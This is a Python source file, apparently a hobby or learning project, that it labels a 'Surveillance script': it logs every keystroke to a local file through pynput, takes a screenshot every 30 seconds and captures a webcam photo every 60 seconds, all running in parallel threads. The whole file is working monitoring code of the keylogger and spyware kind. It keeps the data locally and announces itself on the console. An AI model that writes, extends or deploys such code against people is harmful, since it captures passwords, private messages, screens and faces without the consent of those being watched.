import os
import time
import threading
from datetime import datetime
from pynput import keyboard
import cv2
from PIL import Image
import mss
import numpy as np

# --- FOLDER SETUP ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LOG_DIR = os.path.join(BASE_DIR, "logs")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshots")
WEBCAM_DIR = os.path.join(BASE_DIR, "webcam")

# Create directories if they don't exist
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
os.makedirs(WEBCAM_DIR, exist_ok=True)

KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")

# Global flag for clean shutdown
running = True


# --- KEYLOGGING ---
def keyPressed(key):
    """Clean keylogging output with readable formatting."""
    with open(KEYLOG_FILE, 'a', encoding="utf-8") as logKey:
        try:
            # Regular characters
            logKey.write(key.char)
        except AttributeError:
            # Special cases
            if key == keyboard.Key.space:
                logKey.write(" ")
            elif key == keyboard.Key.enter:
                logKey.write("\n")
            elif key == keyboard.Key.tab:
                logKey.write("[TAB]")
            elif key == keyboard.Key.backspace:
                logKey.write("[BACKSPACE]")
            else:

                pass


# --- SCREEN CAPTURE ---
def screen_capture_loop(interval=30):
    """Continuously captures the screen at a given interval (seconds)."""
    while running:
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = os.path.join(SCREENSHOT_DIR, f"screen_{timestamp}.png")

            with mss.mss() as sct:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
                img.save(filename)

            print(f"Screenshot saved: {filename}")
        except Exception as e:
            print(f"Error in screen capture: {e}")

        time.sleep(interval)


# --- WEBCAM CAPTURE ---
def webcam_capture_loop(interval=60):
    """Continuously captures an image from the webcam at a given interval (seconds)."""
    cam = cv2.VideoCapture(0)

    if not cam.isOpened():
        print("Error: Could not open webcam.")
        return

    while running:
        try:
            ret, frame = cam.read()
            if ret:
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                filename = os.path.join(WEBCAM_DIR, f"webcam_{timestamp}.jpg")
                cv2.imwrite(filename, frame)
                print(f"Webcam image saved: {filename}")
        except Exception as e:
            print(f"Error in webcam capture: {e}")

        time.sleep(interval)

    cam.release()


# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print("Surveillance script started. Press Ctrl+C to stop.")

    try:
        # Start screen capture thread
        screen_thread = threading.Thread(
            target=screen_capture_loop, args=(30,), daemon=True)
        screen_thread.start()

        # Start webcam capture thread
        webcam_thread = threading.Thread(
            target=webcam_capture_loop, args=(60,), daemon=True)
        webcam_thread.start()

        # Start keylogger listener (main thread)
        with keyboard.Listener(on_press=keyPressed) as listener:
            listener.join()

    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Shutting down...")

        # Stop loops
        running = False

        # Stop keylogger listener safely
        try:
            listener.stop()
        except:
            pass

        time.sleep(1)
        print("[✓] All threads stopped. Exiting now.")
